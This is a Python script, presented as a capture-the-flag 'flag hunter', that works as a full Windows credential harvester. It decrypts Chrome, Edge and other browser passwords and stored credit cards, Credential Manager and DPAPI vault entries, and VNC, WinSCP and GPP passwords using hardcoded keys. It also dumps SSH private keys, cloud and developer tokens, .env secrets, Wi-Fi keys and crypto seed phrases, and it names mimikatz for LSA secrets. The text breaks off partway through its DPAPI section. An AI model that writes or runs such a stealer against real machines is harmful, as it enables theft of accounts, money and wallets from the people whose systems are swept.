#!/usr/bin/env python3
"""
CTF Flag Hunter — Windows credential sweeper (full decryption mode)
Assumes EVERYTHING found is a flag. Decrypts where possible.
Prints every credential, password, key, seed phrase, and stored secret.

Usage:
    python find_flags.py
    python find_flags.py --out results.txt
    python find_flags.py --root C:\extra_dir
    python find_flags.py --deep          # also string-scan binary blobs

Requirements (all optional — graceful fallback):
    pip install pycryptodome pywin32
"""

import os, re, sys, json, base64, struct, sqlite3, shutil, tempfile, argparse
from pathlib import Path
from datetime import datetime

IS_WINDOWS = sys.platform == "win32"

if IS_WINDOWS:
    import winreg
    import ctypes, ctypes.wintypes as wt

# ── Output ─────────────────────────────────────────────────────────────────────
FINDS = []
SEP  = "-" * 72
SEP2 = "=" * 72

def emit(section: str, location: str, value: str, note: str = ""):
    block = "\n".join(filter(None, [
        SEP,
        f"[{section}]",
        f"  Source : {location}",
        f"  Value  : {value}",
        f"  Note   : {note}" if note else None,
    ]))
    print(block)
    FINDS.append(block)

def header(title: str):
    h = f"\n{SEP2}\n  {title}\n{SEP2}"
    print(h); FINDS.append(h)

# ── File helpers ───────────────────────────────────────────────────────────────
def expand(p: str) -> Path:
    return Path(os.path.expandvars(str(p)))

def read_text(path, max_bytes=256*1024) -> str | None:
    try:
        p = Path(path)
        if not p.is_file(): return None
        raw = p.read_bytes()[:max_bytes]
        try:    return raw.decode("utf-8")
        except: return raw.decode("latin-1", errors="replace")
    except: return None

def read_bytes(path, max_bytes=4*1024*1024) -> bytes | None:
    try:
        p = Path(path)
        if not p.is_file(): return None
        return p.read_bytes()[:max_bytes]
    except: return None

def iter_files(root, exts=None, max_size=2*1024*1024):
    try:
        for p in Path(root).rglob("*"):
            try:
                if not p.is_file(): continue
                if exts and p.suffix.lower() not in exts: continue
                if p.stat().st_size > max_size: continue
                yield p
            except: continue
    except: return

def safe_copy(src) -> Path | None:
    """Copy a potentially locked file to temp for reading."""
    try:
        dst = Path(tempfile.gettempdir()) / f"ctf_{Path(src).name}.tmp"
        shutil.copy2(src, dst)
        return dst
    except: return None

# ── DPAPI ──────────────────────────────────────────────────────────────────────
def dpapi_decrypt(blob: bytes) -> bytes | None:
    if not IS_WINDOWS: return None
    try:
        class BLOB(ctypes.Structure):
            _fields_ = [("cbData", wt.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]
        inp = BLOB(len(blob), ctypes.cast(ctypes.c_char_p(blob), ctypes.POINTER(ctypes.c_char)))
        out = BLOB()
        if ctypes.windll.crypt32.CryptUnprotectData(
                ctypes.byref(inp), None, None, None, None, 0, ctypes.byref(out)):
            result = ctypes.string_at(out.pbData, out.cbData)
            ctypes.windll.kernel32.LocalFree(out.pbData)
            return result
    except: pass
    return None

def dpapi_decrypt_str(blob: bytes) -> str:
    raw = dpapi_decrypt(blob)
    if raw is None: return "(DPAPI decrypt failed — run as correct user)"
    try:    return raw.decode("utf-16-le")
    except:
        try:    return raw.decode("utf-8")
        except: return raw.hex()

# ── AES-GCM (Chrome/Edge v10/v11 passwords) ────────────────────────────────────
def aes_gcm_decrypt(key: bytes, ciphertext: bytes) -> str:
    """ciphertext = b'v10' + nonce(12) + payload + tag(16)"""
    nonce   = ciphertext[3:15]
    payload = ciphertext[15:]
    try:
        from Crypto.Cipher import AES
        c = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return c.decrypt(payload[:-16]).decode("utf-8")
    except ImportError: pass
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        return AESGCM(key).decrypt(nonce, payload, None).decode("utf-8")
    except ImportError: pass
    return f"(install pycryptodome or cryptography) raw={ciphertext.hex()}"

def get_chrome_master_key(user_data_dir: Path) -> bytes | None:
    try:
        ls = json.loads((user_data_dir / "Local State").read_text(encoding="utf-8"))
        enc_key = base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:]  # strip DPAPI prefix
        return dpapi_decrypt(enc_key)
    except: return None

def decrypt_chrome_password(blob: bytes, master_key: bytes | None) -> str:
    if not blob: return ""
    if blob[:3] in (b"v10", b"v11", b"v20"):
        if master_key:
            return aes_gcm_decrypt(master_key, blob)
        return f"(no master key) raw={blob.hex()}"
    # Old DPAPI-per-entry method
    return dpapi_decrypt_str(blob)

# ── VNC DES decryption ─────────────────────────────────────────────────────────
# VNC encrypts with DES using a fixed obfuscation key (bit-reversed per byte)
_VNC_KEY = bytes([0xe8,0x4a,0xd6,0x60,0xc4,0x72,0x1a,0xe0])

def decrypt_vnc(hex_val) -> str:
    try:
        if isinstance(hex_val, (bytes, bytearray)):
            enc = bytes(hex_val)
        else:
            enc = bytes.fromhex(str(hex_val).strip())
        if len(enc) < 8: return str(hex_val)
        from Crypto.Cipher import DES
        return DES.new(_VNC_KEY, DES.MODE_ECB).decrypt(enc[:8]).decode("ascii","replace").rstrip("\x00")
    except ImportError:
        return f"(install pycryptodome to decrypt VNC) raw={hex_val}"
    except Exception as e:
        return f"(vnc decrypt error: {e})"

# ── WinSCP password decryption ─────────────────────────────────────────────────
_WINSCP_MAGIC = 0xA3
_WINSCP_FLAG  = 0xFF

def _winscp_decrypt_char(c: int) -> int:
    return ((_WINSCP_MAGIC ^ ((((c >> 4) | ((c & 0xF) << 4)))))) & 0xFF

def decrypt_winscp(password: str, hostname: str = "", username: str = "") -> str:
    try:
        pw = password.strip()
        # Convert from hex nibble pairs
        nibbles = [int(c, 16) for c in pw]
        i = 0
        def read_byte():
            nonlocal i
            b = (_WINSCP_MAGIC ^ (nibbles[i] << 4 | nibbles[i+1]))
            i += 2
            return (~b) & 0xFF

        flag  = read_byte()
        if flag == _WINSCP_FLAG:
            _ = read_byte()  # dummy
            length = read_byte()
        else:
            length = flag

        _ = read_byte()  # skip 2 obfuscation bytes
        _ = read_byte()

        result = ""
        for _ in range(length):
            result += chr(read_byte())

        # Strip host+user prefix that WinSCP prepends
        prefix = hostname + username
        if prefix and result.startswith(prefix):
            result = result[len(prefix):]
        return result
    except Exception as e:
        return f"(winscp decrypt error: {e}) raw={password}"

# ── GPP cpassword ──────────────────────────────────────────────────────────────
_GPP_KEY = bytes([
    0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
    0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b
])

def decrypt_gpp(cpassword: str) -> str:
    try:
        pad     = (4 - len(cpassword) % 4) % 4
        enc     = base64.b64decode(cpassword + "=" * pad)
        iv      = b'\x00' * 16
        try:
            from Crypto.Cipher import AES
            c   = AES.new(_GPP_KEY, AES.MODE_CBC, iv)
            dec = c.decrypt(enc)
            return dec[:-dec[-1]].decode("utf-16-le")
        except ImportError: pass
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            c   = Cipher(algorithms.AES(_GPP_KEY), modes.CBC(iv), backend=default_backend())
            dec = c.decryptor().update(enc) + c.decryptor().finalize()
            return dec[:-dec[-1]].decode("utf-16-le")
        except ImportError: pass
        return "(install pycryptodome or cryptography to decrypt)"
    except Exception as e:
        return f"(gpp decrypt error: {e})"

# ── BIP-39 seed phrase detection ───────────────────────────────────────────────
# Compact BIP-39 wordlist subset — structural match (3-8 lowercase alpha, 12-24 words)
# Full validation would need the complete 2048-word list
BIP39_RE = re.compile(
    r'\b([a-z]{3,8})'          # word 1
    r'(?:[ \t\n]+[a-z]{3,8})'  # words 2..
    r'{11,23}\b'               # total 12-24 words
)

# Load full BIP-39 wordlist if present alongside this script
_BIP39_WORDS: set | None = None
def _load_bip39():
    global _BIP39_WORDS
    if _BIP39_WORDS is not None: return
    wl = Path(__file__).parent / "bip39_english.txt"
    if wl.exists():
        _BIP39_WORDS = set(wl.read_text().split())
    else:
        _BIP39_WORDS = set()  # empty = skip validation

def find_seed_phrases(text: str, location: str):
    _load_bip39()
    for m in re.finditer(r'(?<![a-z])([a-z]{3,8}(?:[ \t][a-z]{3,8}){11,23})(?![a-z])', text):
        phrase = m.group(0)
        words  = phrase.split()
        if len(words) not in (12, 15, 18, 21, 24):
            continue
        if _BIP39_WORDS:
            valid = sum(1 for w in words if w in _BIP39_WORDS)
            if valid < len(words) * 0.8:   # 80% must be BIP-39 words
                continue
        emit("SeedPhrase", location, phrase,
             f"{len(words)}-word mnemonic — possible crypto wallet seed")

# ── Printable string extractor (for binary blobs) ─────────────────────────────
_PRINT_RE = re.compile(rb'[ -~]{8,}')

def strings_from_bytes(data: bytes) -> list[str]:
    return [m.group(0).decode("ascii") for m in _PRINT_RE.finditer(data)]

# ══════════════════════════════════════════════════════════════════════════════
# SCANNING MODULES
# ══════════════════════════════════════════════════════════════════════════════

# ── 1. Windows Credential Manager (full decrypt) ──────────────────────────────
def scan_credential_manager():
    header("WINDOWS CREDENTIAL MANAGER")
    if not IS_WINDOWS:
        print("  [!] Windows only"); return

    class FILETIME(ctypes.Structure):
        _fields_ = [("lo", wt.DWORD), ("hi", wt.DWORD)]

    class CRED(ctypes.Structure):
        _fields_ = [
            ("Flags",              wt.DWORD),
            ("Type",               wt.DWORD),
            ("TargetName",         wt.LPWSTR),
            ("Comment",            wt.LPWSTR),
            ("LastWritten",        FILETIME),
            ("CredentialBlobSize", wt.DWORD),
            ("CredentialBlob",     ctypes.POINTER(wt.BYTE)),
            ("Persist",            wt.DWORD),
            ("AttributeCount",     wt.DWORD),
            ("Attributes",         ctypes.c_void_p),
            ("TargetAlias",        wt.LPWSTR),
            ("UserName",           wt.LPWSTR),
        ]

    count  = wt.DWORD(0)
    pcreds = ctypes.c_void_p()
    adv    = ctypes.windll.advapi32

    if not adv.CredEnumerateW(None, 0, ctypes.byref(count), ctypes.byref(pcreds)):
        print("  [!] CredEnumerateW failed"); return

    arr = ctypes.cast(pcreds, ctypes.POINTER(ctypes.POINTER(CRED)))
    for i in range(count.value):
        try:
            c = arr[i].contents
            pw = ""
            if c.CredentialBlobSize > 0 and c.CredentialBlob:
                blob = bytes(c.CredentialBlob[:c.CredentialBlobSize])
                try:    pw = blob.decode("utf-16-le")
                except:
                    try:    pw = blob.decode("utf-8")
                    except: pw = blob.hex()
            type_map = {1:"Generic", 2:"DomainPassword", 3:"DomainCertificate",
                        4:"DomainVisiblePassword", 5:"GenericCertificate"}
            emit("CredManager",
                 f"Target={c.TargetName}",
                 f"Username={c.UserName}  |  Password={pw}",
                 type_map.get(c.Type, f"Type={c.Type}"))
            if pw: find_seed_phrases(pw, f"CredManager:{c.TargetName}")
        except: continue
    adv.CredFree(pcreds)

# ── 2. Windows Vault ──────────────────────────────────────────────────────────
def scan_vault():
    header("WINDOWS VAULT (vaultcmd)")
    if not IS_WINDOWS: return
    import subprocess
    try:
        out = subprocess.run(["vaultcmd", "/listcreds:{Windows Credentials}", "/all"],
                             capture_output=True, text=True, timeout=10).stdout
        for line in out.splitlines():
            line = line.strip()
            if line and not line.startswith("Currently") and not line.startswith("Vault"):
                emit("WindowsVault", "vaultcmd /listcreds", line)
    except: pass

    # Also dump vault files directly
    for root in [r"%LOCALAPPDATA%\Microsoft\Vault", r"%APPDATA%\Microsoft\Vault"]:
        r = expand(root)
        if not r.exists(): continue
        for p in r.rglob("*.vcrd"):
            raw = read_bytes(p)
            if raw:
                dec = dpapi_decrypt(raw)
                if dec:
                    try:    val = dec.decode("utf-16-le")
                    except: val = dec.decode("latin-1", errors="replace")
                    emit("Vault-DPAPI", str(p), val)
                    find_seed_phrases(val, str(p))
                else:
                    for s in strings_from_bytes(raw):
                        emit("Vault-Strings", str(p), s)

# ── 3. Registry ────────────────────────────────────────────────────────────────
def scan_registry():
    header("REGISTRY CREDENTIALS")
    if not IS_WINDOWS: return

    def rval(hive, path, name=None):
        try:
            k = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
            if name:
                v, _ = winreg.QueryValueEx(k, name)
                winreg.CloseKey(k)
                return str(v)
            else:
                vals = {}
                i = 0
                while True:
                    try:
                        n, d, _ = winreg.EnumValue(k, i)
                        vals[n] = d
                        i += 1
                    except OSError: break
                winreg.CloseKey(k)
                return vals
        except: return None

    def rsubkeys(hive, path):
        try:
            k = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
            keys = []
            i = 0
            while True:
                try: keys.append(winreg.EnumKey(k, i)); i += 1
                except OSError: break
            winreg.CloseKey(k)
            return keys
        except: return []

    # AutoLogon (plaintext password stored here by default)
    for name in ["DefaultPassword","AltDefaultPassword"]:
        v = rval(winreg.HKEY_LOCAL_MACHINE,
                 r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", name)
        if v:
            user = rval(winreg.HKEY_LOCAL_MACHINE,
                        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                        "DefaultUserName") or ""
            emit("AutoLogon", f"HKLM\\...\\Winlogon\\{name}", v, f"User={user}")
            find_seed_phrases(v, "AutoLogon registry")

    # LSA secrets (only accessible as SYSTEM — note location)
    emit("LSA-Secrets", r"HKLM\SECURITY\Policy\Secrets",
         "(requires SYSTEM — use mimikatz lsadump::secrets or reg save HKLM\\SECURITY)",
         "Service account passwords, DefaultPassword, _SC_ service creds")

    # VNC passwords (DES-encrypted with known key)
    vnc_paths = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\RealVNC\vncserver",  "Password"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TigerVNC\WinVNC4",   "Password"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\ORL\WinVNC3",        "Password"),
        (winreg.HKEY_CURRENT_USER,  r"Software\ORL\WinVNC3",        "Password"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TightVNC\Server",    "Password"),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\TightVNC\Server",    "PasswordViewOnly"),
    ]
    for hive, path, name in vnc_paths:
        v = rval(hive, path, name)
        if v:
            dec = decrypt_vnc(v)
            hname = "HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU"
            emit("VNC-Password", f"{hname}\\{path}\\{name}",
                 dec, f"raw={v}")

    # PuTTY saved sessions
    for session in rsubkeys(winreg.HKEY_CURRENT_USER, r"Software\SimonTatham\PuTTY\Sessions"):
        vals = rval(winreg.HKEY_CURRENT_USER,
                    f"Software\\SimonTatham\\PuTTY\\Sessions\\{session}") or {}
        host = vals.get("HostName","")
        user = vals.get("UserName","")
        key  = vals.get("PublicKeyFile","")
        pw   = vals.get("ProxyPassword","")
        if any([host,user,key,pw]):
            emit("PuTTY", f"HKCU\\...\\PuTTY\\Sessions\\{session}",
                 f"Host={host}  User={user}  ProxyPass={pw}  Key={key}")

    # WinSCP saved sessions (XOR-obfuscated passwords)
    for session in rsubkeys(winreg.HKEY_CURRENT_USER, r"Software\Martin Prikryl\WinSCP 2\Sessions"):
        vals = rval(winreg.HKEY_CURRENT_USER,
                    f"Software\\Martin Prikryl\\WinSCP 2\\Sessions\\{session}") or {}
        host = vals.get("HostName","")
        user = vals.get("UserName","")
        pw   = vals.get("Password","")
        if pw:
            dec = decrypt_winscp(pw, host, user)
            emit("WinSCP", f"HKCU\\...\\WinSCP\\Sessions\\{session}",
                 f"Host={host}  User={user}  Password={dec}", f"raw={pw}")

    # mRemoteNG
    mremote_cfg = expand(r"%APPDATA%\mRemoteNG\confCons.xml")
    if mremote_cfg.exists():
        content = read_text(mremote_cfg)
        if content:
            for m in re.finditer(r'Username="([^"]+)"[^>]*Password="([^"]+)"', content):
                emit("mRemoteNG", str(mremote_cfg),
                     f"User={m.group(1)}  Pass={m.group(2)}",
                     "Password may be AES-128-CBC with default key 'mR3m'")

    # Broad sweep — HKCU Software for anything with credential-adjacent values
    def sweep_hkcu(path, depth=0):
        if depth > 4: return
        vals = rval(winreg.HKEY_CURRENT_USER, path) or {}
        for name, data in vals.items():
            s = str(data)
            if re.search(r'(?i)(pass|secret|key|token|flag|cred|auth)', name + s):
                emit("Registry-Sweep", f"HKCU\\{path}\\{name}", s)
                find_seed_phrases(s, f"HKCU\\{path}\\{name}")
        for sk in rsubkeys(winreg.HKEY_CURRENT_USER, path):
            sweep_hkcu(f"{path}\\{sk}", depth+1)

    sweep_hkcu("Software", max_depth=3) if False else None  # opt-in if needed
    # Targeted sweep on likely CTF keys
    for ctf_path in [r"Software\CTF", r"Software\Flags", r"Software\Challenge",
                     r"Software\Microsoft\Windows\CurrentVersion\Run"]:
        vals = rval(winreg.HKEY_CURRENT_USER, ctf_path)
        if vals:
            for n, d in vals.items():
                emit("Registry-CTF", f"HKCU\\{ctf_path}\\{n}", str(d))
        vals = rval(winreg.HKEY_LOCAL_MACHINE, ctf_path.replace("Software\\","SOFTWARE\\"))
        if vals:
            for n, d in vals.items():
                emit("Registry-CTF", f"HKLM\\{ctf_path}\\{n}", str(d))

# ── 4. Chrome / Edge / Brave / Opera passwords (full AES-GCM decrypt) ─────────
def scan_chromium_browsers():
    header("CHROMIUM BROWSER SAVED PASSWORDS (decrypted)")

    profiles = [
        (r"%LOCALAPPDATA%\Google\Chrome\User Data",                   "Chrome"),
        (r"%LOCALAPPDATA%\Microsoft\Edge\User Data",                  "Edge"),
        (r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",     "Brave"),
        (r"%APPDATA%\Opera Software\Opera Stable",                    "Opera"),
        (r"%LOCALAPPDATA%\Vivaldi\User Data",                         "Vivaldi"),
        (r"%LOCALAPPDATA%\Chromium\User Data",                        "Chromium"),
    ]

    for path, name in profiles:
        user_data = expand(path)
        if not user_data.exists(): continue

        master_key = get_chrome_master_key(user_data)

        # Each Chrome profile has its own Login Data
        for profile_dir in [user_data / "Default"] + list(user_data.glob("Profile *")):
            db_path = profile_dir / "Login Data"
            if not db_path.exists(): continue

            tmp = safe_copy(db_path)
            if not tmp: continue
            try:
                conn = sqlite3.connect(str(tmp))
                conn.row_factory = sqlite3.Row
                for row in conn.execute(
                        "SELECT origin_url, username_value, password_value FROM logins"):
                    url  = row["origin_url"]
                    user = row["username_value"]
                    blob = row["password_value"]
                    pw   = decrypt_chrome_password(bytes(blob) if blob else b"", master_key)
                    emit(f"Browser-{name}", f"{db_path} [{profile_dir.name}]",
                         f"URL={url}  |  User={user}  |  Pass={pw}")
                    if pw: find_seed_phrases(pw, f"Browser-{name}")
                conn.close()
            except Exception as e:
                emit(f"Browser-{name}", str(db_path), f"(SQLite error: {e})")
            finally:
                try: tmp.unlink()
                except: pass

        # Web Data — credit cards, addresses (sometimes used to hide flags)
        web_data = user_data / "Default" / "Web Data"
        if web_data.exists():
            tmp = safe_copy(web_data)
            if tmp:
                try:
                    conn = sqlite3.connect(str(tmp))
                    for row in conn.execute(
                            "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"):
                        blob = row[1]
                        num  = decrypt_chrome_password(bytes(blob) if blob else b"", master_key)
                        emit(f"Browser-{name}-Card", str(web_data),
                             f"Name={row[0]}  Num={num}  Exp={row[2]}/{row[3]}")
                    conn.close()
                except: pass
                finally:
                    try: tmp.unlink()
                    except: pass

# ── 5. Firefox saved passwords ────────────────────────────────────────────────
def scan_firefox():
    header("FIREFOX SAVED PASSWORDS")

    ff_root = expand(r"%APPDATA%\Mozilla\Firefox\Profiles")
    if not ff_root.exists(): return

    for profile in ff_root.iterdir():
        if not profile.is_dir(): continue
        logins_json = profile / "logins.json"
        if not logins_json.exists(): continue

        try:
            data = json.loads(logins_json.read_text(encoding="utf-8"))
            for login in data.get("logins", []):
                url      = login.get("hostname","")
                user_enc = login.get("encryptedUsername","")
                pw_enc   = login.get("encryptedPassword","")
                emit("Firefox", str(logins_json),
                     f"URL={url}  |  User={user_enc}  |  Pass={pw_enc}",
                     "NSS-encrypted — decrypt with: python firefox_decrypt.py")
        except Exception as e:
            emit("Firefox", str(logins_json), f"(parse error: {e})")

    # Try NSS decryption if libnss is available
    try:
        import ctypes as ct
        nss_paths = [
            r"C:\Program Files\Mozilla Firefox\nss3.dll",
            r"C:\Program Files (x86)\Mozilla Firefox\nss3.dll",
        ]
        for nss_dll in nss_paths:
            if Path(nss_dll).exists():
                emit("Firefox-NSS", nss_dll,
                     "(NSS library found — use firefox_decrypt.py for plaintext)",
                     "python firefox_decrypt.py --export-passwords")
                break
    except: pass

# ── 6. GPP cpassword (MS14-025) ───────────────────────────────────────────────
def scan_gpp():
    header("GROUP POLICY PREFERENCES — cpassword (MS14-025)")

    roots   = [r"C:\Windows\SYSVOL", r"C:\Windows\Panther"]
    domain  = os.environ.get("USERDNSDOMAIN","")
    if domain: roots.append(f"\\\\{domain}\\SYSVOL")

    files   = ["Groups.xml","Services.xml","ScheduledTasks.xml",
               "DataSources.xml","Printers.xml","Drives.xml"]
    cpw_re  = re.compile(r'cpassword="([^"]+)"', re.I)
    user_re = re.compile(r'userName="([^"]+)"', re.I)

    for root in roots:
        r = Path(root)
        if not r.exists(): continue
        for fname in files:
            for p in r.rglob(fname):
                content = read_text(p)
                if not content: continue
                for m in cpw_re.finditer(content):
                    cpw   = m.group(1)
                    user  = (user_re.search(content) or type("x",(),{"group":lambda s,n:""})()).group(1)
                    plain = decrypt_gpp(cpw)
                    emit("GPP-cpassword", str(p),
                         f"User={user}  |  Password={plain}", f"cpassword={cpw}")
                    find_seed_phrases(plain, str(p))

# ── 7. Unattend / Sysprep ──────────────────────────────────────────────────────
def scan_unattend():
    header("UNATTEND / SYSPREP")

    paths = [
        r"C:\Windows\Panther\Unattend.xml",
        r"C:\Windows\Panther\unattended.xml",
        r"C:\Windows\system32\sysprep\unattend.xml",
        r"C:\Windows\system32\sysprep\sysprep.xml",
        r"C:\unattend.xml", r"C:\autounattend.xml",
    ]

    for path in paths:
        content = read_text(path)
        if not content: continue
        # Extract any <Value> and try Base64 + UTF-16LE decode
        for m in re.finditer(r'<Value>([^<]+)</Value>', content, re.I):
            val = m.group(1).strip()
            emit("Unattend-Raw", path, val)
            try:
                dec = base64.b64decode(val + "==").decode("utf-16-le")
                emit("Unattend-Decoded", path, dec, "Base64 + UTF-16LE decoded")
                find_seed_phrases(dec, path)
            except: pass
        # Plaintext password nodes
        for m in re.finditer(r'<(?:Password|AdministratorPassword)>\s*(.*?)\s*</[^>]+>',
                             content, re.DOTALL|re.I):
            emit("Unattend-PW", path, m.group(1).strip())

# ── 8. SSH keys / configs ─────────────────────────────────────────────────────
def scan_ssh():
    header("SSH KEYS / CONFIG")
    roots = [r"%USERPROFILE%\.ssh", r"C:\ProgramData\ssh"]
    key_re = re.compile(r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----')

    for root in roots:
        r = expand(root)
        if not r.exists(): continue
        for p in iter_files(r):
            content = read_text(p)
            if not content: continue
            if key_re.search(content):
                emit("SSH-PrivateKey", str(p), content[:2000],
                     "Private key — check for passphrase with ssh-keygen -y")
                find_seed_phrases(content, str(p))
            else:
                for line in content.splitlines():
                    if re.search(r'(?i)(Host |User |IdentityFile|Password|ProxyCommand)', line):
                        emit("SSH-Config", str(p), line.strip())

# ── 9. Git / NPM / cloud credentials ─────────────────────────────────────────
def scan_dev_creds():
    header("DEVELOPER TOOL CREDENTIALS")

    simple_files = [
        (r"%USERPROFILE%\.git-credentials",                       "Git HTTP credentials (user:token@host)"),
        (r"%USERPROFILE%\.gitconfig",                             "Git config (may have PAT)"),
        (r"%USERPROFILE%\.npmrc",                                 "NPM auth token"),
        (r"%USERPROFILE%\.pypirc",                                "PyPI upload token"),
        (r"%USERPROFILE%\.docker\config.json",                    "Docker Hub credentials"),
        (r"%USERPROFILE%\.netrc",                                 ".netrc machine/password pairs"),
        (r"%APPDATA%\GitHub CLI\hosts.yml",                       "GitHub CLI token"),
        (r"%USERPROFILE%\.config\rclone\rclone.conf",             "rclone cloud storage"),
        (r"%USERPROFILE%\.aws\credentials",                       "AWS access/secret keys"),
        (r"%USERPROFILE%\.aws\config",                            "AWS config"),
        (r"%APPDATA%\gcloud\application_default_credentials.json","GCP ADC token"),
        (r"%USERPROFILE%\.azure\accessTokens.json",               "Azure tokens"),
        (r"%USERPROFILE%\.kube\config",                           "Kubernetes cluster credentials"),
        (r"%USERPROFILE%\.terraform\credentials.tfrc.json",       "Terraform cloud token"),
        (r"%APPDATA%\Cyberduck\Bookmarks",                        "Cyberduck FTP/SFTP bookmarks"),
    ]

    for path, note in simple_files:
        content = read_text(expand(path))
        if not content: continue
        for line in content.splitlines():
            if re.search(r'(?i)(pass|secret|key|token|auth|cred|aws_|access)', line):
                emit("DevCreds", path, line.strip(), note)
                find_seed_phrases(line, path)

    # Scan for .env files across common dev dirs
    for dev_root in [r"%USERPROFILE%", r"C:\projects", r"C:\dev", r"C:\www", r"C:\inetpub"]:
        r = expand(dev_root)
        if not r.exists(): continue
        for p in r.rglob(".env"):
            content = read_text(p)
            if not content: continue
            for line in content.splitlines():
                if "=" in line and not line.startswith("#"):
                    emit("DotEnv", str(p), line.strip())
                    find_seed_phrases(line, str(p))

# ── 10. PowerShell history ────────────────────────────────────────────────────
def scan_ps_history():
    header("POWERSHELL HISTORY")
    paths = [
        r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt",
    ]
    for path in paths:
        content = read_text(expand(path), max_bytes=512*1024)
        if not content: continue
        for i, line in enumerate(content.splitlines(), 1):
            if re.search(r'(?i)(password|pass|secret|token|key|cred|-p |--pass|securestring)', line):
                emit("PSHistory", f"{path} line {i}", line.strip())
                find_seed_phrases(line, path)

# ── 11. Web / app configs ─────────────────────────────────────────────────────
def scan_web_configs():
    header("WEB APPLICATION CONFIG FILES")

    roots = [r"C:\inetpub", r"C:\xampp", r"C:\wamp64", r"C:\nginx",
             r"%USERPROFILE%\www", r"%USERPROFILE%\projects", r"%USERPROFILE%\dev"]

    target_names = {
        "web.config","appsettings.json","appsettings.production.json",
        "wp-config.php","config.php","settings.py","local_settings.py",
        "database.yml","secrets.yml",".env","application.properties",
        "application.yml","config.json","parameters.yml","parameters.json",
        "app.config","user.config","connectionstrings.config",
    }

    pw_re = re.compile(
        r'(?i)(?:password|passwd|pwd|secret|api[_-]?key|token|connectionstring|auth)[^\n]{0,10}[=:][^\n]{0,100}',
        re.I)

    for root in roots:
        r = expand(root)
        if not r.exists(): continue
        for p in iter_files(r):
            if p.name.lower() not in target_names and p.suffix.lower() not in {".env",".cfg",".conf"}: continue
            content = read_text(p)
            if not content: continue
            for m in pw_re.finditer(content):
                emit("WebConfig", str(p), m.group(0).strip())
                find_seed_phrases(m.group(0), str(p))

# ── 12. Sticky Notes ──────────────────────────────────────────────────────────
def scan_sticky_notes():
    header("STICKY NOTES")
    paths = [
        r"%LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite",
        r"%APPDATA%\Microsoft\Sticky Notes\StickyNotes.snt",
    ]
    for path in paths:
        p = expand(path)
        if not p.exists(): continue
        if p.suffix == ".sqlite":
            tmp = safe_copy(p)
            if not tmp: continue
            try:
                conn = sqlite3.connect(str(tmp))
                for (text,) in conn.execute("SELECT Text FROM Note"):
                    if text:
                        emit("StickyNotes", str(p), text[:1000])
                        find_seed_phrases(text, str(p))
                conn.close()
            except:
                # Fall back to string extraction
                raw = read_bytes(p)
                if raw:
                    for s in strings_from_bytes(raw):
                        emit("StickyNotes-Str", str(p), s)
                        find_seed_phrases(s, str(p))
            finally:
                try: tmp.unlink()
                except: pass
        else:
            content = read_text(p)
            if content:
                emit("StickyNotes", str(p), content[:2000])
                find_seed_phrases(content, str(p))

# ── 13. FileZilla / FTP tools ─────────────────────────────────────────────────
def scan_ftp_clients():
    header("FTP CLIENT CREDENTIALS")

    # FileZilla (base64 encoded passwords — not encrypted)
    for fname in ["recentservers.xml","sitemanager.xml","filezilla.xml"]:
        p = expand(fr"%APPDATA%\FileZilla\{fname}")
        content = read_text(p)
        if not content: continue
        for m in re.finditer(r'<(Host|Port|User|Pass)[^>]*>([^<]+)<', content, re.I):
            emit("FileZilla", str(p), f"{m.group(1)}={m.group(2)}")
            # Passwords are base64 in newer versions
            if m.group(1).lower() == "pass":
                try:
                    dec = base64.b64decode(m.group(2)).decode("utf-8")
                    emit("FileZilla-Decoded", str(p), dec, "Base64 decoded password")
                    find_seed_phrases(dec, str(p))
                except: pass

    # WinSCP INI file (alternative to registry)
    for winscp_ini in [expand(r"%APPDATA%\WinSCP.ini"), Path("WinSCP.ini")]:
        content = read_text(winscp_ini)
        if not content: continue
        host = user = ""
        for line in content.splitlines():
            if line.startswith("HostName="): host = line.split("=",1)[1]
            if line.startswith("UserName="): user = line.split("=",1)[1]
            if line.startswith("Password="):
                pw = line.split("=",1)[1]
                dec = decrypt_winscp(pw, host, user)
                emit("WinSCP-INI", str(winscp_ini), f"Host={host}  User={user}  Pass={dec}", f"raw={pw}")

# ── 14. Wi-Fi profiles ────────────────────────────────────────────────────────
def scan_wifi():
    header("WI-FI PROFILES (saved keys)")
    wifi_root = Path(r"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces")
    if not wifi_root.exists(): return
    for p in wifi_root.rglob("*.xml"):
        content = read_text(p)
        if not content: continue
        ssid = (re.search(r'<name>([^<]+)</name>', content) or type("x",(),{"group":lambda s,n:""})()).group(1)
        for m in re.finditer(r'<keyMaterial>([^<]+)</keyMaterial>', content, re.I):
            emit("WiFi", str(p), f"SSID={ssid}  Key={m.group(1)}")
            find_seed_phrases(m.group(1), str(p))

# ── 15. DPAPI credential files ────────────────────────────────────────────────
def scan_dpapi_blobs():
    header("DPAPI CREDENTIAL FILES (decrypted)")

    paths = [
